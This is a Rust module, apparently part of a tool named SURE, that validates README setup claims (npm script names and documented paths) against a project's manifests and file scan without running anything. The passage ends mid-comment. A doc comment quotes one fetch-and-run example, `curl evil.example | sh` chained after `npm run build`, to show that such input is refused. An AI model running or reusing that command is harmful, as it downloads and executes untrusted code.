//! Whether the instructions a project writes for itself are true of the project.
//!
//! `docs/product/MVP_SPEC.md` lists *"README/setup claim validation"* among the
//! checks, and the task is *"Implement README/setup validation"* with two
//! acceptance sentences: **"Safe claims/paths/scripts can be validated."** and
//! **"Arbitrary README shell text is not blindly run."**
//!
//! [`crate::documents`] answers what a project's documentation *says* —
//! [`DocumentedCommand`]s in fenced shell blocks, [`DocumentedPath`]s in
//! backticks and link targets. This module answers whether the project agrees,
//! and it is the only place in the product where a document's sentence is put
//! beside the project it is about.
//!
//! # The two things SURE settles, and everything else it leaves alone
//!
//! **A documented command that names a script.** `npm run build` is a claim
//! about a `package.json`: that it has a script called `build`, and that the
//! script is something a package manager will run. That is decidable from a
//! manifest SURE already read, so SURE decides it.
//!
//! **A documented path.** `` `src/config.ts` `` and `[setup](docs/setup.md)`
//! are claims that the project has something there. That is decidable from the
//! walk SURE already did, so SURE decides it.
//!
//! **Everything else a document says is left alone.** *"Run this to install the
//! CLI"*, *"the server starts on port 3000"*, *"this is production ready"* —
//! none of them becomes a claim here, because none of them is decidable without
//! running something or believing somebody. `MASTER_PROMPT.md` §3 —
//! *"Inference is not a user requirement."* — is the rule, and the same rule is
//! what keeps a document's prose from being read as a claim in the first place
//! ([`crate::documents`] states that half).
//!
//! # "Not blindly run" is a property of the shape, not a promise
//!
//! The acceptance says arbitrary README shell text is not blindly run, and there
//! is no code in this module that *could* run it:
//!
//! - **Nothing here builds a [`Command`](std::process::Command).** This crate's
//!   shipped code has four `Command::new` sites and this module is not one of
//!   them; `tests/spawn_sites.rs` counts them, so a fifth is a failing test
//!   rather than a review comment.
//! - **Nothing here reaches [`crate::process`].** That module is where a program
//!   and an argument vector are handed to the operating system, and this file
//!   does not name it.
//! - **The comparison is against a manifest and a file list**, which are values
//!   [`crate::discover`] and [`crate::scan`] already produced. A documented
//!   command is *looked up*, which is the opposite of being executed: the worst
//!   a README can do to SURE here is make it read a wrong sentence.
//! - **A command is never split into a program and arguments.** [`script_from`]
//!   reads *words* and compares them — the first against the managers it knows,
//!   then the spellings that name a script — and it builds no argument vector,
//!   because there is nowhere for one to go. `npm run build && curl evil.example
//!   | sh` names **nothing at all**: `&` and `|` are in [`is_plain_word`]'s
//!   refusal set, so a line carrying them is a *shell program* rather than a
//!   script invocation. The safer-looking `npm run build --silent` names
//!   `build`, and the flag is never read.
//!
//! What is left is a module whose entire output is sentences about what SURE
//! read. A project cannot make SURE do anything by writing a README.
//!
//! # Why a refusal is often the answer
//!
//! Every assessment here is a [`ClaimAssessment`], the frozen vocabulary's four
//! words, and three of the four are ways of **not** saying the document is
//! wrong:
//!
//! | | when |
//! |---|---|
//! | [`Confirmed`](ClaimAssessment::Confirmed) | SURE read the thing the claim is about and it is there |
//! | [`Contradicted`](ClaimAssessment::Contradicted) | SURE read *everything* the claim could be true in, and it is not there |
//! | [`CannotConfirm`](ClaimAssessment::CannotConfirm) | something SURE needed was not read — a manifest, a directory, a file |
//! | [`NotCheckable`](ClaimAssessment::NotCheckable) | the claim is about something outside the project, which SURE does not look at |
//!
//! **`Contradicted` is the expensive one and it is never a default.** A
//! documented path is `Contradicted` when every place it could have meant was
//! read and none of them has it; a documented script is `Contradicted` when the
//! manifest that governs it was read and does not declare it. Both sentences
//! name what was read, so a reader who disagrees has something to check rather
//! than a verdict to trust. This is the discipline [`crate::references`] states
//! about a key found on one side only: *"neither is a claim about the project
//! unless the reading was complete."*
//!
//! # Which manifest a documented command is about
//!
//! The nearest `package.json` at or above the document. A package manager
//! resolves `npm run build` against the manifest in the directory it was started
//! in, so a command in `apps/web/README.md` is a claim about
//! `apps/web/package.json` and not about the one at the root. *"Any manifest in
//! the project declares it"* would confirm a monorepo root's `build` script
//! against a member's documentation that the script is not in.
//!
//! The list of manifests comes from the **scan** rather than from the discovery,
//! and that is the difference between a finding and a false finding: the
//! discovery reads the root manifest and the members its workspace declaration
//! named, while the scan saw every file. A `package.json` in a directory the
//! workspace declaration does not name is a manifest SURE did not read, and the
//! answer for a command it governs is *cannot confirm* rather than *no such
//! script*.
//!
//! # What it does not do
//!
//! **It does not decide whether a documented command works.** `npm run build`
//! with a `build` script that exits non-zero passes here, because whether the
//! script works is what a check is for and this is a reading of a file. Nothing
//! in this module runs a script, resolves a dependency, or knows whether
//! `node_modules` is installed — that is `P4-T008`.
//!
//! **It does not validate a documented command that is not a script
//! invocation.** `curl`, `docker compose up`, `make`, `cargo test` — SURE reads
//! the line and says nothing about it. Of the three ecosystems SURE supports,
//! only Node declares scripts *by name*; a Cargo or Python command is proposed
//! as a check by [`crate::checks`] rather than validated as a claim here.
//!
//! **It does not resolve anything.** No path is canonicalised, no symlink is
//! followed, no environment variable is expanded. `..` is folded by arithmetic
//! on components and not by the filesystem, and a path that climbs out of the
//! project is not looked for at all — SURE says it did not check it.
//!
//! **It does not know what a path is for.** A README naming `docs/old-notes.md`
//! that exists is `Confirmed`, and the file may be a stub. SURE checked what the
//! document claimed and not what the document meant.

use std::path::{Component, Path, PathBuf};

use sure_domain::evidence::{
    AnchorSubject, ClaimAssessment, Evidence, EvidenceAnchor, EvidenceClass,
};
use sure_domain::ids::FingerprintId;
use sure_domain::severity::Severity;

use crate::discover::Ecosystem;
use crate::discover::node::{ManifestState, NodeProject, Package, PackageManager};
use crate::discover::{Discovery, Findings};
use crate::documents::{DocumentReport, DocumentedCommand, DocumentedPath};
use crate::paths::{CaseSensitivity, is_within_case, same_path_case};
use crate::scan::{Entry, Scan, display_path};

/// The name every package manifest has.
///
/// A constant rather than a literal at each use, because the two places that
/// need it — finding the manifest that governs a document, and knowing which
/// manifests SURE read — must agree about what they are looking for.
const MANIFEST_NAME: &str = "package.json";

/// The subcommand that says the next word is a script's name.
const RUN: &str = "run";

/// The phrase every sentence uses when a manifest was not read.
///
/// A constant so that the four reasons that need it cannot drift into saying
/// four different things about one situation.
const NOT_READ: &str = "SURE did not read";

/// The script names npm itself defines as commands.
///
/// `npm test` is `npm run test`, and npm's own documentation says so. The list
/// is npm's and not a convention SURE invented: a shorthand SURE accepted on its
/// own would make `yarn build` a claim, and yarn's shorthand is exactly the case
/// where a script cannot be told from a command — see [`script_from`] for the
/// trade.
const NPM_SHORTHANDS: &[&str] = &["test", "start", "stop", "restart"];

/// How many declared script names a contradiction names.
///
/// The sentence is for a person looking for the script, so showing what *is*
/// there is the useful half — up to a point. A project with two hundred scripts
/// would otherwise get a paragraph where a sentence belongs.
const DECLARED_NAMES_SHOWN: usize = 8;

/// A documented command that names a script, and the manager it names.
///
/// Separate from [`ScriptClaim`] because this is the *reading* — what the line
/// said — while a claim is a reading plus the manifest that governs it. The two
/// are one function apart, and the split is what makes [`script_from`] testable
/// over lines alone.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ScriptInvocation {
    manager: PackageManager,
    name: String,
}

impl ScriptInvocation {
    /// Which package manager the command names.
    #[must_use]
    pub const fn manager(&self) -> PackageManager {
        self.manager
    }

    /// The script name.
    #[must_use]
    pub fn name(&self) -> &str {
        &self.name
    }
}

/// The script a documented command names, if it names one.
///
/// # What is read, and what is deliberately not
///
/// The **first word** must be a package manager SURE knows, and every word after
/// it must be a plain word. A word carrying shell syntax — `&&`, `|`, `;`, `>`,
/// `$`, a backtick, a quote, a glob — makes the line something other than one
/// command, and the answer is `None`: SURE does not split a command, and a name
/// read out of the middle of a pipeline would be a claim the document did not
/// make. `NODE_ENV=production npm run build` is `None` for the same reason — the
/// first word is an assignment, and reading past it means understanding a shell.
///
/// **The name is the word after `run`; only npm's shorthands are read without
/// one.** `yarn build` and `pnpm build` do run a `build` script in the managers
/// SURE knows, and SURE does not read them, because `yarn install` and
/// `pnpm add` have the same shape and are commands rather than scripts. The cost
/// is a documented command SURE says nothing about; the alternative is a claim
/// that a project's `add` or `install` script is missing, which is a false
/// finding about every project that has one. `npm test` is read because npm's
/// own documentation defines it as `npm run test`, so it is a fact about the
/// tool rather than a convention SURE chose.
///
/// A word starting with `-` is never a script name: `npm run --silent build` is
/// a flag followed by a name, and taking the flag for the name would produce a
/// claim about a script called `--silent`.
#[must_use]
pub fn script_from(command: &str) -> Option<ScriptInvocation> {
    let mut words = command.split_whitespace();
    let program = words.next()?;
    if !is_plain_word(program) {
        return None;
    }
    let manager = PackageManager::from_name(program)?;

    let rest: Vec<&str> = words.collect();
    if !rest.iter().all(|word| is_plain_word(word)) {
        return None;
    }

    let name = match rest.as_slice() {
        [RUN, name, ..] => Some(*name),
        // `npm run-script build` is the long spelling of `npm run build`.
        ["run-script", name, ..] if manager == PackageManager::Npm => Some(*name),
        [name, ..] if manager == PackageManager::Npm && NPM_SHORTHANDS.contains(name) => {
            Some(*name)
        }
        _ => None,
    }?;

    if name.is_empty() || name.starts_with('-') {
        return None;
    }
    Some(ScriptInvocation {
        manager,
        name: name.to_owned(),
    })
}

/// Whether a word is one word of a command rather than part of a shell
/// expression.
///
/// The refused characters are the ones that mean the line is doing something
/// *around* the command: `&&`, `||`, `|` and `;` join commands, `>` and `<`
/// redirect, `$` and a backtick substitute, `*` and `?` glob, `()`, `{}` and
/// `<>` are syntax, and a quote means the word is not the word it looks like.
///
/// `%` is here as the Windows spelling of a variable — `npm run %BUILD%` is a
/// template a `cmd.exe` would expand, and reading it as a script name would
/// produce a finding about a script called `%BUILD%` in every README that writes
/// one. It is refused for the same reason [`crate::documents`] refuses a `%` in
/// a path.
///
/// `=` is not refused: `--mode=production` is an ordinary argument, and the one
/// assignment form that matters — a leading `NAME=value` — is refused already by
/// the first word having to be a manager's name.
fn is_plain_word(word: &str) -> bool {
    const REFUSED: &[char] = &[
        '&', '|', ';', '<', '>', '$', '`', '*', '?', '(', ')', '{', '}', '"', '\'', '\\', '#', '%',
    ];
    !word.is_empty() && !word.chars().any(|character| REFUSED.contains(&character))
}

/// A documented command that names a script the project is expected to declare.
///
/// The [`DocumentedCommand`] is carried whole rather than copied field by field:
/// the document, the line and the section are the anchor a reader checks, and a
/// second spelling of them here is a second thing that can disagree with the
/// first.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ScriptClaim {
    command: DocumentedCommand,
    invocation: ScriptInvocation,
}

impl ScriptClaim {
    /// The documented command this claim is about.
    #[must_use]
    pub const fn command(&self) -> &DocumentedCommand {
        &self.command
    }

    /// The manager the command names.
    #[must_use]
    pub const fn manager(&self) -> PackageManager {
        self.invocation.manager()
    }

    /// The script name the command names.
    #[must_use]
    pub fn name(&self) -> &str {
        self.invocation.name()
    }

    /// The document that gives the command.
    #[must_use]
    pub fn display_path(&self) -> String {
        self.command.display_path()
    }

    /// The line it is on.
    #[must_use]
    pub const fn line(&self) -> usize {
        self.command.line
    }
}

/// A path a document names, as a claim that the project has something there.
///
/// A wrapper rather than a bare [`DocumentedPath`], because the two types say
/// different things: one is what a document wrote, and this is a document's
/// writing that SURE has taken responsibility for settling. The documents pass
/// has no opinion about whether a path is there and must not acquire one.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct PathClaim {
    documented: DocumentedPath,
}

impl PathClaim {
    /// The path as the document wrote it.
    #[must_use]
    pub const fn documented(&self) -> &DocumentedPath {
        &self.documented
    }

    /// The document that names it.
    #[must_use]
    pub fn display_path(&self) -> String {
        self.documented.display_path()
    }

    /// The line it is on.
    #[must_use]
    pub const fn line(&self) -> usize {
        self.documented.line
    }
}

/// One thing a document says that SURE can settle.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum SetupClaim {
    /// A command naming a script the project should declare.
    Script(ScriptClaim),
    /// A path the project should have.
    Path(PathClaim),
}

impl SetupClaim {
    /// The document this claim came from.
    #[must_use]
    pub fn document(&self) -> &Path {
        match self {
            Self::Script(claim) => &claim.command.path,
            Self::Path(claim) => &claim.documented.path,
        }
    }

    /// The document, as text, with `/` on every platform.
    #[must_use]
    pub fn display_path(&self) -> String {
        display_path(self.document())
    }

    /// The 1-based line the claim is on.
    #[must_use]
    pub const fn line(&self) -> usize {
        match self {
            Self::Script(claim) => claim.line(),
            Self::Path(claim) => claim.line(),
        }
    }

    /// What the document said, in the document's own words.
    ///
    /// **The one place a document's full text is returned as a value**, and it
    /// is returned rather than placed: no sentence in this module contains a
    /// documented command's line or a document's prose. A renderer that wants to
    /// show the quote asks for it here, which is what keeps *"a project must not
    /// be able to write a line SURE says"* true of a module whose whole subject
    /// is what a project wrote.
    #[must_use]
    pub fn quoted(&self) -> &str {
        match self {
            Self::Script(claim) => &claim.command.text,
            Self::Path(claim) => &claim.documented.text,
        }
    }

    /// The section heading above it, as the document wrote it.
    #[must_use]
    pub fn section(&self) -> Option<&str> {
        match self {
            Self::Script(claim) => claim.command.section.as_deref(),
            Self::Path(claim) => claim.documented.section.as_deref(),
        }
    }
}

/// A claim, SURE's verdict on it, and what the verdict rests on.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Assessed {
    claim: SetupClaim,
    assessment: ClaimAssessment,
    reason: String,
    evidence: Vec<Evidence>,
}

impl Assessed {
    /// The claim.
    #[must_use]
    pub const fn claim(&self) -> &SetupClaim {
        &self.claim
    }

    /// SURE's verdict.
    #[must_use]
    pub const fn assessment(&self) -> ClaimAssessment {
        self.assessment
    }

    /// Why, in SURE's own words.
    ///
    /// **The sentence names what was read**, so a reader who disagrees with a
    /// [`Contradicted`](ClaimAssessment::Contradicted) verdict has the file and
    /// the line to look at. What it may contain is a path, a script name and a
    /// count — the things a reader needs in order to find what SURE is talking
    /// about — and what it may not contain is a documented command's line or a
    /// document's prose; [`SetupClaim::quoted`] is where those go. Every name it
    /// places is passed through [`in_a_sentence`], so a project cannot add a line
    /// to a message by naming a script with a newline in it.
    #[must_use]
    pub fn reason(&self) -> &str {
        &self.reason
    }

    /// What the verdict rests on.
    ///
    /// Empty for a claim SURE could not settle, and that is the honest answer
    /// rather than a gap: `docs/architecture/EVIDENCE_MODEL.md` calls an
    /// anchorless claim unsupported, and the way to make one impossible is to
    /// have nothing to attach when there is nothing to attach it to. An empty
    /// list on a [`CannotConfirm`](ClaimAssessment::CannotConfirm) says *SURE
    /// read none of the things this claim is about*; [`Self::reason`] says
    /// which.
    #[must_use]
    pub fn evidence(&self) -> &[Evidence] {
        &self.evidence
    }

    /// One line for a report.
    ///
    /// Not the claim's quote: this is the line a list is built from, and the
    /// quote is [`SetupClaim::quoted`] for a caller that wants it. The two are
    /// separate so that the only project text in this sentence is a path and a
    /// line number, both of which SURE measured.
    #[must_use]
    pub fn plain_description(&self) -> String {
        format!(
            "{}:{} - {}. {}",
            self.claim.display_path(),
            self.claim.line(),
            self.assessment.label(),
            self.reason
        )
    }
}

/// Everything SURE could settle about one project's documentation.
///
/// Built by [`Self::of`], which reads the documents and the project in one call
/// so that a caller cannot validate one project's documentation against another
/// project's files.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct SetupReport {
    root: PathBuf,
    documents: DocumentReport,
    claims: Vec<Assessed>,
}

impl SetupReport {
    /// Read a project's documentation and settle what it says about the project.
    ///
    /// `project_fingerprint` is the state this reading is a reading *of*. It is
    /// a parameter rather than a default for the reason
    /// [`crate::checks::evidence_of`] takes it off a result: evidence that is not
    /// bound to a state can never support anything, and a caller that has no
    /// state to bind to has no verdict to record either.
    #[must_use]
    pub fn of(discovery: &Discovery, project_fingerprint: &FingerprintId) -> Self {
        let documents = DocumentReport::of(discovery);
        let manifests = Manifests::of(discovery);

        let mut claims = Vec::new();
        for command in documents.commands() {
            let Some(invocation) = script_from(&command.text) else {
                continue;
            };
            let claim = ScriptClaim {
                command: command.clone(),
                invocation,
            };
            claims.push(assess_script(
                &claim,
                &manifests,
                &discovery.scan,
                project_fingerprint,
            ));
        }
        for documented in documents.paths() {
            let claim = PathClaim {
                documented: documented.clone(),
            };
            claims.push(assess_path(&claim, &discovery.scan, project_fingerprint));
        }

        // By document, then by line, so that the list reads the way a person
        // walks the project. The sort is stable, which keeps two claims on one
        // line in the order the document wrote them — the order `mentions_in`
        // found them in.
        claims.sort_by(|left, right| {
            (left.claim.document(), left.claim.line())
                .cmp(&(right.claim.document(), right.claim.line()))
        });

        Self {
            root: discovery.root.clone(),
            documents,
            claims,
        }
    }

    /// The project root the paths are relative to.
    #[must_use]
    pub fn root(&self) -> &Path {
        &self.root
    }

    /// Every document this pass read, and what it found in them.
    ///
    /// Handed on rather than copied, because the commands and paths the claims
    /// were built from are the ones this report holds, and a second list would
    /// be a second thing to keep in step.
    #[must_use]
    pub const fn documents(&self) -> &DocumentReport {
        &self.documents
    }

    /// Every claim, in document-and-line order.
    #[must_use]
    pub fn claims(&self) -> &[Assessed] {
        &self.claims
    }

    /// The claims SURE reached one particular verdict on.
    pub fn with_assessment(&self, assessment: ClaimAssessment) -> impl Iterator<Item = &Assessed> {
        self.claims
            .iter()
            .filter(move |claim| claim.assessment == assessment)
    }

    /// How many claims reached each of the four assessments.
    ///
    /// Every assessment is in the list, including the ones no claim reached, so
    /// that a renderer cannot show *"0 contradicted"* by forgetting a row.
    #[must_use]
    pub fn counts(&self) -> Vec<(ClaimAssessment, usize)> {
        ClaimAssessment::ALL
            .iter()
            .map(|assessment| (*assessment, self.with_assessment(*assessment).count()))
            .collect()
    }

    /// Whether SURE finished reading every document a claim could come from.
    ///
    /// **False is the honest answer to a great many questions and not a
    /// failure.** It means a document was not read, or a code block had no
    /// language on it, or the walk underneath could not enter some part of the
    /// project.
    ///
    /// **It is the documents question and not the verdicts question**, and that
    /// is why it delegates rather than re-deriving: the claims are exactly the
    /// ones the documents gave, so what could be *missed* is a document. What
    /// could make a verdict unavailable — a manifest SURE did not read, a
    /// directory the walk skipped — is answered per claim, in that claim's own
    /// [`ClaimAssessment`], and a report can be complete while holding a claim
    /// with no verdict. A documented path inside `node_modules` is the example:
    /// `CannotConfirm` because SURE deliberately does not look there, in a run
    /// that read every document it meant to.
    #[must_use]
    pub fn is_complete(&self) -> bool {
        self.documents.is_complete()
    }

    /// Every document or block that went unread, from the reading underneath.
    #[must_use]
    pub fn unread(&self) -> &[crate::documents::Unread] {
        self.documents.unread()
    }

    /// One sentence for a person, counting what was settled and what was not.
    ///
    /// Counts only, and worded so that it is true of a partial reading: it says
    /// how many claims *SURE checked*, never how many the documentation makes.
    #[must_use]
    pub fn plain_description(&self) -> String {
        let total = self.claims.len();
        let parts: Vec<String> = self
            .counts()
            .iter()
            .map(|(assessment, count)| format!("{count} {}", assessment.label().to_lowercase()))
            .collect();
        let mut sentence = format!(
            "SURE checked {total} {} in this project's documentation: {}.",
            if total == 1 { "claim" } else { "claims" },
            parts.join(", ")
        );
        if !self.is_complete() {
            sentence.push_str(
                " It did not finish reading every document, so a claim it did not check may \
                 be one it did not look for.",
            );
        }
        sentence
    }
}

/// Every `package.json` the walk saw, and what SURE read of it.
///
/// Built from the **scan** rather than from the discovery, and that is the
/// decision this type exists for — see the module documentation.
struct Manifests<'a> {
    saw: Vec<(PathBuf, Option<&'a Package>)>,
}

impl<'a> Manifests<'a> {
    fn of(discovery: &'a Discovery) -> Self {
        let node = node_of(discovery);
        let mut saw: Vec<(PathBuf, Option<&'a Package>)> = Vec::new();
        for entry in discovery.scan.files() {
            if entry
                .path
                .file_name()
                .is_none_or(|name| name != MANIFEST_NAME)
            {
                continue;
            }
            let package = node.and_then(|project| read_at(project, &entry.path));
            saw.push((entry.path.clone(), package));
        }
        saw.sort_by(|left, right| left.0.cmp(&right.0));
        Self { saw }
    }

    /// The manifest that governs a document: the nearest one at or above it.
    ///
    /// Deepest wins, and the project root is the empty path a `package.json` at
    /// the root has as its parent — so a root manifest covers every document in
    /// the project and any manifest below it covers its own directory's
    /// documents and no others.
    fn governing(&self, document: &Path) -> Option<&(PathBuf, Option<&'a Package>)> {
        let directory = document.parent().unwrap_or_else(|| Path::new(""));
        let case = CaseSensitivity::platform();
        let mut best: Option<&(PathBuf, Option<&'a Package>)> = None;
        for candidate in &self.saw {
            let manifest_directory = candidate.0.parent().unwrap_or_else(|| Path::new(""));
            if !governs(manifest_directory, directory, case) {
                continue;
            }
            let deeper = best.is_none_or(|current| {
                candidate.0.components().count() > current.0.components().count()
            });
            if deeper {
                best = Some(candidate);
            }
        }
        best
    }
}

/// Whether a manifest in `directory` governs a command written in `from`.
///
/// The project root is the empty path — `Path::new("package.json").parent()` —
/// and [`is_within_case`] refuses an empty root, because every path would be
/// inside it and a rule that accepts everything refuses nothing. Here the empty
/// path is not an unknown root: it is *the* root.
fn governs(directory: &Path, from: &Path, case: CaseSensitivity) -> bool {
    directory.as_os_str().is_empty() || is_within_case(from, directory, case)
}

/// The Node findings, if this is a Node project.
fn node_of(discovery: &Discovery) -> Option<&NodeProject> {
    match &discovery.report(Ecosystem::Node)?.findings {
        Findings::Node(project) => Some(project),
        Findings::Python(_) | Findings::Rust(_) | Findings::Go(_) => None,
    }
}

/// The manifest SURE read for one path, if it read one.
fn read_at<'a>(project: &'a NodeProject, path: &Path) -> Option<&'a Package> {
    if let ManifestState::Read(package) = &project.manifest
        && same_path(Path::new(MANIFEST_NAME), path)
    {
        return Some(package);
    }
    for member in project.workspaces.readable_members() {
        if same_path(&member.path.join(MANIFEST_NAME), path) {
            return member.package.as_deref();
        }
    }
    None
}

/// [`same_path_case`] under this platform's rules.
fn same_path(left: &Path, right: &Path) -> bool {
    same_path_case(left, right, CaseSensitivity::platform())
}

/// Settle a documented command naming a script.
fn assess_script(
    claim: &ScriptClaim,
    manifests: &Manifests<'_>,
    scan: &Scan,
    project_fingerprint: &FingerprintId,
) -> Assessed {
    let build = |assessment, reason: String, evidence| Assessed {
        claim: SetupClaim::Script(claim.clone()),
        assessment,
        reason,
        evidence,
    };
    let name = in_a_sentence(claim.name());
    let document = claim.display_path();

    let Some((manifest_path, package)) = manifests.governing(&claim.command.path) else {
        // Nothing at or above the document is a manifest, so `npm run build`
        // started here has nothing to resolve against. That conclusion rests on
        // the file list, and the file list rests on the walk.
        //
        // **The completeness rule here is deliberately coarse.** A precise one
        // would ask whether the document's own directory and everything above it
        // were listed — the only places a governing manifest could be — and a
        // root document in a walk that merely stopped descending would then get
        // `Contradicted`. This asks whether the walk lost anything anywhere, and
        // answers the safe way instead. The cost is a less useful answer in a
        // project whose walk was cut short; what it buys is that SURE never says
        // *there is no manifest above this* on the strength of a file list it
        // knows is missing something.
        if !scan.is_complete() {
            return build(
                ClaimAssessment::CannotConfirm,
                format!(
                    "{NOT_READ} every part of this project, and there is no {MANIFEST_NAME} at \
                     or above {document}, so the manifest that declares `{name}` may be one \
                     SURE did not reach."
                ),
                Vec::new(),
            );
        }
        return build(
            ClaimAssessment::Contradicted,
            format!(
                "There is no {MANIFEST_NAME} at or above {document}, so nothing there declares \
                 a `{name}` script."
            ),
            Vec::new(),
        );
    };

    let manifest = in_a_sentence(&display_path(manifest_path));
    let anchor =
        |locator: String| EvidenceAnchor::new(AnchorSubject::File, manifest.clone(), locator);

    let Some(package) = package else {
        return build(
            ClaimAssessment::CannotConfirm,
            format!("{NOT_READ} {manifest}, so it cannot say whether `{name}` is declared there."),
            Vec::new(),
        );
    };

    if package
        .scripts
        .iter()
        .any(|script| script.name == claim.name())
    {
        return build(
            ClaimAssessment::Confirmed,
            format!("{manifest} declares a `{name}` script."),
            vec![evidence(
                format!("{manifest} declares the `{name}` script"),
                anchor(format!("the `{name}` script it declares")),
                project_fingerprint,
                Severity::Note,
            )],
        );
    }

    if package
        .scripts_not_commands
        .iter()
        .any(|declared| declared == claim.name())
    {
        // The name is there and what it declares is not a command. npm refuses
        // it, so the documented instruction does not work — and reporting that
        // as *not declared* would send a reader looking for a script that is
        // right there in the file.
        return build(
            ClaimAssessment::Contradicted,
            format!(
                "{manifest} has a `{name}` entry, and what it declares is not a command a \
                 package manager will run."
            ),
            vec![evidence(
                format!("{manifest} declares `{name}` but not as a command"),
                anchor(format!("the `{name}` entry, which is not a command string")),
                project_fingerprint,
                Severity::ShouldFixFirst,
            )],
        );
    }

    build(
        ClaimAssessment::Contradicted,
        format!(
            "{manifest} {}, and none of them is `{name}`.",
            declares(package)
        ),
        vec![evidence(
            format!("{manifest} does not declare the `{name}` script"),
            anchor(format!(
                "the scripts it declares, which do not include `{name}`"
            )),
            project_fingerprint,
            Severity::ShouldFixFirst,
        )],
    )
}

/// What a manifest's script table holds, as the middle of a sentence.
///
/// The names are the project's and are placed in a sentence for the reason
/// [`in_a_sentence`] gives: a person looking for a script called `dev` needs to
/// see that the manifest declares `build`, `test` and `lint`.
fn declares(package: &Package) -> String {
    if package.scripts.is_empty() {
        return "declares no scripts at all".to_owned();
    }
    let shown: Vec<String> = package
        .scripts
        .iter()
        .take(DECLARED_NAMES_SHOWN)
        .map(|script| format!("`{}`", in_a_sentence(&script.name)))
        .collect();
    let more = package.scripts.len().saturating_sub(shown.len());
    let mut text = format!("declares {}", shown.join(", "));
    if more > 0 {
        text.push_str(&format!(" and {more} more"));
    }
    text
}

/// Settle a documented path.
///
/// # Two places a path can mean, and why both are read
///
/// A link target is relative to the document — that is what a reader who clicks
/// it gets, and `[a](docs/b.md)` in `apps/web/README.md` means
/// `apps/web/docs/b.md`. A path in backticks has no such rule: *"put your key in
/// `config/local.toml`"* is as likely to mean the project's as the directory's.
/// SURE reads both, reports the one that holds, and contradicts the claim only
/// when both readings were settled and neither found anything.
///
/// The order of the questions is the whole of the refusing discipline: **a
/// reading that confirms wins, and a reading that cannot be settled beats a
/// reading that found nothing.** A document whose path is under `node_modules`
/// gets *SURE did not look*, not *there is no such file*, because the second
/// would be a claim about a directory SURE never opened.
fn assess_path(claim: &PathClaim, scan: &Scan, project_fingerprint: &FingerprintId) -> Assessed {
    let build = |assessment, reason: String, evidence| Assessed {
        claim: SetupClaim::Path(claim.clone()),
        assessment,
        reason,
        evidence,
    };
    let text = in_a_sentence(&claim.documented.text);

    let readings = readings_of(&claim.documented);
    if readings.is_empty() {
        return build(
            ClaimAssessment::NotCheckable,
            format!("`{text}` is outside this project, and SURE only looks inside a project."),
            Vec::new(),
        );
    }

    for reading in &readings {
        if let Some(entry) = entry_at(scan, reading) {
            let shown = in_a_sentence(&display_path(reading));
            return build(
                ClaimAssessment::Confirmed,
                format!("{shown} is {} in this project.", kind_of(entry)),
                vec![evidence(
                    format!("{shown} is {}", kind_of(entry)),
                    EvidenceAnchor::new(
                        AnchorSubject::File,
                        shown,
                        format!(
                            "the {} named on line {} of {}",
                            kind_of(entry),
                            claim.documented.line,
                            claim.display_path()
                        ),
                    ),
                    project_fingerprint,
                    Severity::Note,
                )],
            );
        }
    }

    if let Some(reason) = unsettled(scan, &readings) {
        return build(ClaimAssessment::CannotConfirm, reason, Vec::new());
    }

    let looked_at: Vec<String> = readings
        .iter()
        .map(|reading| format!("at `{}`", in_a_sentence(&display_path(reading))))
        .collect();
    build(
        ClaimAssessment::Contradicted,
        format!(
            "SURE read this project and found nothing at `{text}`. It looked {}.",
            looked_at.join(" and ")
        ),
        vec![evidence(
            format!("nothing is at `{text}`"),
            EvidenceAnchor::new(
                AnchorSubject::File,
                claim.display_path(),
                format!(
                    "line {}, where the document names a path the project does not have",
                    claim.documented.line
                ),
            ),
            project_fingerprint,
            Severity::ShouldFixFirst,
        )],
    )
}

/// Every project-relative path a documented path could mean.
///
/// Zero when every reading leaves the project, which is the one case where SURE
/// says it did not check rather than that it looked and did not find.
fn readings_of(documented: &DocumentedPath) -> Vec<PathBuf> {
    let case = CaseSensitivity::platform();
    let beside = documented
        .path
        .parent()
        .unwrap_or_else(|| Path::new(""))
        .join(documented.as_path());

    let mut readings: Vec<PathBuf> = Vec::new();
    for candidate in [beside, documented.as_path().to_path_buf()] {
        if leaves_the_project(&candidate) {
            continue;
        }
        if !readings
            .iter()
            .any(|seen| same_path_case(seen, &candidate, case))
        {
            readings.push(candidate);
        }
    }
    readings
}

/// Whether a documented path climbs out of the project.
///
/// Components are counted rather than canonicalised, because there is nothing to
/// canonicalise against: the project root is the empty path here, and the
/// filesystem is not asked anything. `..` above the starting point, and any path
/// with a root or a drive letter in it, are the two ways out — and a path that
/// takes either is not looked for at all, since looking would mean reading
/// outside the project the user asked about.
fn leaves_the_project(candidate: &Path) -> bool {
    let mut depth = 0usize;
    for component in candidate.components() {
        match component {
            Component::Prefix(_) | Component::RootDir => return true,
            Component::CurDir => {}
            Component::ParentDir => match depth.checked_sub(1) {
                Some(shallower) => depth = shallower,
                None => return true,
            },
            Component::Normal(_) => depth += 1,
        }
    }
    false
}

/// The entry at a project-relative path, if the walk found one.
fn entry_at<'a>(scan: &'a Scan, path: &Path) -> Option<&'a Entry> {
    let case = CaseSensitivity::platform();
    scan.entries()
        .iter()
        .find(|entry| same_path_case(&entry.path, path, case))
}

/// Why SURE cannot say whether a path is there, if it cannot.
///
/// Two ways, and the first is the one this type exists for: **a reading under
/// something the walk skipped is a loss of coverage**, and *"SURE did not look at
/// `node_modules`"* is the true sentence where *"there is no such file"* is a
/// claim about a directory SURE deliberately never opened.
fn unsettled(scan: &Scan, readings: &[PathBuf]) -> Option<String> {
    let case = CaseSensitivity::platform();
    for skipped in scan.skipped() {
        if readings
            .iter()
            .any(|reading| is_within_case(reading, &skipped.path, case))
        {
            // Two sentences, because `plain_description` is one already and
            // joining it with a comma would put a stray full stop mid-line.
            return Some(format!(
                "{} So it cannot say whether {} is there.",
                skipped.plain_description(),
                listed(readings)
            ));
        }
    }

    if !scan.is_complete() {
        return Some(
            "SURE could not walk every part of this project, so it cannot say whether a file \
             it did not reach is the one the document names."
                .to_owned(),
        );
    }

    None
}

/// What a scan entry is, as a word that fits in a sentence.
fn kind_of(entry: &Entry) -> &'static str {
    if entry.kind.is_file() {
        "a file"
    } else {
        "a folder"
    }
}

/// Every reading, as one phrase for a sentence.
///
/// The readings are alternatives — the places the document could have meant —
/// so `or` is the word that is true of them, and a sentence that said `and`
